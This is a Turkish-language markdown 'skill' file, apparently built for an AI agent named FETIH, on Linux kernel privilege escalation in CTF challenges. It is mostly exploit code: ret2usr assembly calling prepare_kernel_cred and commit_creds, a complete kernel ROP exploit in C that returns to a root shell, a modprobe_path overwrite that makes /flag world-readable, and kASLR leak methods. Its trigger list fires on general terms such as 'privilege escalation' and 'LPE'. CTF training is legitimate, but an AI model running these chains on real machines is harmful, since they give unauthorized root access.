---
name: kernel-pwn-basics
description: Linux kernel pwn temelleri — char device exploitation, ret2usr, KPTI/SMEP/SMAP bypass, modprobe_path overwrite, privesc primitives
tags: [ctf, pwn, kernel, lkm, char-device, ret2usr, kpti, smep, smap, kaslr, privesc, ioctl, qemu]
triggers:
  - "kernel module"
  - "kernel pwn"
  - "lkm"
  - ".ko file"
  - "char device"
  - "/dev/vuln"
  - "ioctl"
  - "qemu kernel"
  - "bzImage"
  - "rootfs.cpio"
  - "privilege escalation"
  - "LPE"
  - "kASLR"
  - "SMEP"
  - "SMAP"
  - "KPTI"
  - "modprobe_path"
  - "init_cred"
  - "commit_creds"
difficulty: hard
category: pwn
solved_challenges:
  - "TokyoWesterns CTF 2019 - gnote (kernel UAF)"
  - "RealWorldCTF 2022 - vad (kernel heap)"
  - "DiceCTF 2023 - babyrop_2 (kernel basics)"
  - "Hxp 2020 - kernel-rop (KROP)"
related_skills:
  - buffer-overflow-rop
  - ret2libc
  - heap-exploit
  - srop-attack
adapted_for: fetih
---

# Linux Kernel Pwn — Temeller ve LPE Yolu

Kernel pwn = ring 0'a çıkmak. Genelde QEMU + custom kernel + custom LKM (Loadable Kernel Module) verilir. Hedef: `root` shell veya `flag` okuma (root-only).

---

## Ne Zaman Kullan

Challenge dizininde:
- `bzImage` (kernel image)
- `rootfs.cpio` veya `initramfs.cpio.gz`
- `run.sh` (qemu komutu)
- `*.ko` (kernel module — zafiyetin burada)
- Bazen `vmlinux` (kernel symbols için)

---

## Kurulum & Ortam

```bash
# Challenge'ı çıkar
mkdir work && cd work
zcat rootfs.cpio.gz | cpio -idmv
# veya
cpio -idmv < rootfs.cpio

# .ko dosyasını bul
find . -name "*.ko"

# QEMU komutunu incele
cat run.sh
# Tipik:
# qemu-system-x86_64 \
#   -m 64M \
#   -kernel bzImage \
#   -initrd rootfs.cpio \
#   -append "console=ttyS0 quiet" \
#   -nographic \
#   -monitor /dev/null \
#   -cpu kvm64,+smep,+smap   # proteksiyonlar burada görülür

# Local'de qemu başlat (debug için)
./run.sh
```

### Kernel Symbols (vmlinux)
```bash
# vmlinux yoksa bzImage'dan extract et
extract-vmlinux bzImage > vmlinux

# Sembolleri kontrol et
nm vmlinux | grep commit_creds
nm vmlinux | grep prepare_kernel_cred
nm vmlinux | grep modprobe_path
```

### Modül Yükleme
```bash
# QEMU içinde
insmod vuln.ko
ls -la /dev/vuln    # char device olarak görünmeli
```

---

## Mitigation Tespit

`/proc/cpuinfo` ve `dmesg`:
```bash
# QEMU içinde
cat /proc/cpuinfo | grep -E '(smep|smap|kpti)'
dmesg | grep -i "isolation\|smep\|smap"
cat /proc/cmdline   # kaslr, nokaslr, pti, nopti, vsyscall
```

### Proteksiyon Matrisi (Kernel)

| Proteksiyon | Tespit | Etkisi | Bypass |
|---|---|---|---|
| **kASLR** | `/proc/kallsyms` rastgele veya cmdline `kaslr` | Kernel base rastgele | leak (timing, /proc, side channel) |
| **SMEP** | `/proc/cpuinfo \| grep smep` | Kernel kullanıcı sayfasında kod çalıştıramaz | KROP (kernel ROP) |
| **SMAP** | `/proc/cpuinfo \| grep smap` | Kernel kullanıcı sayfasından okuyamaz | stac/clac gadget, copy_from_user |
| **KPTI** | `dmesg \| grep PTI` | Kernel/user page tables ayrı | tek başına engel değil |
| **KASLR + KPTI** | Beraber | Klasik ret2usr engellenir | İhtiyaç: tam KROP |
| **kCFI** | Modern kernels | Kernel control flow integrity | Engellenir, tipinde gadget |

---

## Saldırı 1 — Ret2usr (En Eski, KPTI/SMEP Yoksa)

**Koşul:** SMEP YOK (eski kernel veya qemu komutunda `+smep` yok).

```c
// Privesc shellcode (kullanıcı uzayında)
void privesc() {
    // commit_creds(prepare_kernel_cred(0))
    asm volatile (
        "movabs $0xffffffff81080a30, %rax\n"  // prepare_kernel_cred
        "xor %rdi, %rdi\n"
        "call *%rax\n"
        "movabs $0xffffffff81080800, %rcx\n"  // commit_creds
        "mov %rax, %rdi\n"
        "call *%rcx\n"
    );
}

void privesc_kernel_to_user() {
    // KPTI yoksa userland'a dön
    asm volatile (
        "swapgs\n"
        "mov $user_data_seg, %ax\n"     // ds
        "mov %ax, %ds\n"
        "mov %ax, %es\n"
        "mov %ax, %fs\n"
        "mov %ax, %gs\n"
        "pushq $0x2b\n"                 // user SS
        "pushq $user_rsp\n"
        "pushq $0x202\n"                // RFLAGS
        "pushq $0x33\n"                 // user CS
        "pushq $shell_addr\n"
        "iretq\n"
    );
}
```

```c
// Exploit
int fd = open("/dev/vuln", O_RDWR);

// Overflow vuln ioctl yapısını → return address üzerine yaz
char payload[256];
*(uint64_t*)(payload + offset) = (uint64_t)privesc;

ioctl(fd, EVIL_CMD, payload);

// Şimdi root olduk, shell aç
system("/bin/sh");
```

---

## Saldırı 2 — KROP (Kernel ROP, SMEP Var)

**Koşul:** SMEP var, KPTI olabilir/olmayabilir.

```python
# 1. vmlinux'tan gadget çıkar
ropper --file vmlinux --search "pop rdi; ret"
ROPgadget --binary vmlinux | grep "pop rdi"

# 2. Klasik zincir
# - pop_rdi_ret
# - 0 (prepare_kernel_cred argümanı)
# - prepare_kernel_cred
# - mov_rdi_rax_ret veya pop_rsi_ret + mov_rdi_rax
# - commit_creds
# - swapgs_restore_regs_and_return_to_usermode (KPTI uyumlu)
# - 0, 0 (RBP, RBX dummy)
# - user_shell_addr
# - user_cs (0x33)
# - user_rflags (0x202)
# - user_rsp
# - user_ss (0x2b)
```

```c
// kernel_rop_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :: "memory"
    );
}

void shell() {
    system("/bin/sh");
}

int main() {
    save_state();

    // KASLR yoksa sabit adresler:
    unsigned long pop_rdi_ret = 0xffffffff810f3c83;
    unsigned long prepare_kernel_cred = 0xffffffff8108e530;
    unsigned long commit_creds = 0xffffffff8108e190;
    unsigned long mov_rdi_rax_ret = 0xffffffff81012345;  // örnek
    unsigned long swapgs_restore = 0xffffffff81e00ff0;   // örnek

    unsigned long rop[64];
    int i = 0;

    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;                          // prepare_kernel_cred(0)
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax_ret;            // rdi = result
    rop[i++] = commit_creds;               // commit_creds(rdi)

    // Kullanıcı uzayına geri dön (KPTI uyumlu)
    rop[i++] = swapgs_restore;
    rop[i++] = 0;                          // rbp dummy
    rop[i++] = 0;                          // rbx dummy
    rop[i++] = (unsigned long)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_rsp;
    rop[i++] = user_ss;

    int fd = open("/dev/vuln", O_RDWR);

    // Overflow buffer
    char payload[256 + sizeof(rop)];
    memset(payload, 'A', 256);
    memcpy(payload + 256, rop, sizeof(rop));

    write(fd, payload, sizeof(payload));
    return 0;
}
```

---

## Saldırı 3 — modprobe_path Overwrite

**En kolay LPE:** Arbitrary write primitive varsa, `modprobe_path` global değişkenini değiştir. Sistem bilinmeyen executable çağrıldığında bu path'i kullanır.

```c
// 1. Arbitrary write ile modprobe_path = "/tmp/x" yap
// 2. /tmp/x içine "#!/bin/sh\nchmod +s /bin/sh" yaz, chmod +x
// 3. Tanınmayan magic byte'lı dosyayı çalıştırmaya çalış
//    → kernel modprobe çağırır → /tmp/x root olarak çalışır

void modprobe_exploit() {
    // Arbitrary write primitive ile:
    unsigned long modprobe_path = 0xffffffff82a59e60;  // nm vmlinux | grep modprobe_path
    char *new_path = "/tmp/x\x00";
    arbitrary_write(modprobe_path, new_path, 8);

    // /tmp/x oluştur
    system("echo -e '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");

    // Tetikle: invalid magic byte dosyası çalıştır
    system("echo -e '\xff\xff\xff\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");

    // Flag artık erişilebilir
    system("cat /flag");
}
```

---

## Saldırı 4 — init_cred Direct Write

`init_cred` struct'ı kernel'de sabit adreste. Arbitrary write ile mevcut process'in `cred` pointer'ını `init_cred` ile değiştir.

```python
# 1. nm vmlinux | grep init_cred → init_cred adresi
# 2. mevcut process'in task_struct'ında cred field offset'i (~0x4c0)
# 3. task_struct adresini bul (find_task_by_vpid veya leak)
# 4. task->cred = init_cred (arbitrary write)
```

---

## kASLR Bypass

```bash
# /proc/kallsyms - root değilse "0x000..." gösterir
cat /proc/kallsyms | head

# Side channel - timing
# Kernel modülünde format string varsa leak

# /proc/modules
cat /proc/modules    # modül base address sızar (capability bağımlı)

# dmesg
dmesg | grep -i "kaslr\|0xffffffff"
```

```c
// Kernel modülünden leak (modulün kendinde leak primitive varsa)
read(fd, leak_buf, 0x100);
unsigned long kernel_base = *(unsigned long*)leak_buf - KNOWN_OFFSET;
```

---

## GDB Kernel Debugging

```bash
# qemu komutuna -s -S ekle (port 1234)
qemu-system-x86_64 ... -s -S

# Ayrı terminal
gdb vmlinux
(gdb) target remote :1234
(gdb) hbreak commit_creds
(gdb) continue
```

---

## Tipik Char Device Zafiyetleri

### Stack BOF
```c
// .ko içinde:
char buf[64];
copy_from_user(buf, user_ptr, user_size);  // user_size unchecked
```

### UAF
```c
ioctl(fd, ALLOC, &handle);
ioctl(fd, FREE, handle);
// handle hala valid, kfree edildi
ioctl(fd, USE, handle);  // UAF
```

### Heap Overflow
```c
// kmalloc(0x40), 0x80 byte yaz
```

### Race Condition (TOCTOU)
```c
// kernel: copy_from_user(&len, user_len, sizeof(len));
//         if (len > MAX) return -EINVAL;
//         copy_from_user(buf, user_buf, len);  // len yeniden okunur, race
```

---

## Tuzaklar

1. **`commit_creds(0)` çalışmaz** — `prepare_kernel_cred(0)` ile new cred oluştur, sonra `commit_creds(new_cred)`.
2. **iretq vs swapgs_restore** — KPTI varsa `swapgs_restore_regs_and_return_to_usermode` gerekir (KAISER); KPTI yoksa direct iretq.
3. **User state korunmalı** — `cs, ss, rflags, rsp` privesc öncesi kaydet, dönüşte aynısını koy.
4. **SMAP varken** copy_from_user kullan, doğrudan user pointer dereference yapma. `stac` gadget'ı arar veya `__copy_from_user_inatomic`'i çağırırsın.
5. **kASLR adresleri** rastgele — sabit adresler hayal kırıklığı. Önce leak primitive arar/yaratırsın.
6. **`/proc/kallsyms` 0x000** — `kptr_restrict` aktif. root için açık ama LPE öncesi root değiliz.
7. **bzImage extract** failed olabilir — `extract-vmlinux` script yoksa `vmlinux-to-elf` veya manuel `dd` ile çıkar.

---

## Pratik Workflow

```
1. Challenge'ı incele: bzImage, rootfs.cpio, *.ko, run.sh
2. rootfs çıkar, /init scriptini oku (modül yüklendi mi?)
3. .ko dosyasını Ghidra/IDA'da aç → zafiyet ara
4. Zafiyet türünü tespit (BOF, UAF, OOB, race)
5. Mitigation kontrol et (qemu komutu + cpuinfo)
6. Exploit primitives kur (leak, write, free)
7. Privesc tekniğini seç (ret2usr / KROP / modprobe / cred)
8. Tam exploit yaz
9. Local'de qemu içinde test et
10. Remote'a uyarla
```

---

## Cross-Skill Pivot

```
Kernel challenge → mitigation tespit
                ├── SMEP/KPTI yok → ret2usr
                ├── SMEP var → KROP
                ├── arbitrary write var → modprobe_path / init_cred
                ├── userland exploit primitives → buffer-overflow-rop skill
                └── seccomp filter → seccomp-sandbox-escape skill
```

---

## Ek Kaynaklar

- LKMidaa kernel pwn serisi: https://lkmidas.github.io/
- pawnyable.cafe kernel pwn: https://pawnyable.cafe/
- ctf-wiki kernel pwn: https://ctf-wiki.org/en/pwn/linux/kernel-mode/
- "A Bug Hunter's Diary" (Linux kernel bölümleri)

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: ce5526ea7d360e29
-->

